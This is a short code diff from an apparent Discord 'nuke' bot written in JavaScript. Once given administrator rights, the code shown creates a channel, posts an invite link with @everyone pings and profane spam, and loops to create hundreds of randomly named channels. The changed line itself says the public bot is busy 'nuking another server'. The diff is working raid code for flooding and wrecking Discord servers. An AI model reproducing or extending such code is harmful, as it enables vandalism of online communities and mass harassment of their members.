@@ -221,7 +221,7 @@ client.on('message', msg => {
       if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
        var number = 0
        
-       msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/rYagK4sPKU @everyone https://cdn.discordapp.com/attachments/735103595250188338/775341588590755900/video0.mov").then(c.send("@everyone fucked by cube").then(c.send("rip webhook spam shitcord killed it"))))
+       msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/rYagK4sPKU @everyone https://cdn.discordapp.com/attachments/735103595250188338/775341588590755900/video0.mov").then(c.send("@everyone fucked by cube").then(c.send("rip webhook spam shitcord killed it(oh also if the bot is slow its probably bcs its nuking another server remember this is a public bot and may be overloaded)"))))
         while(number < 399) {
             msg.guild.channels.create(random123()).then(c => { 
                
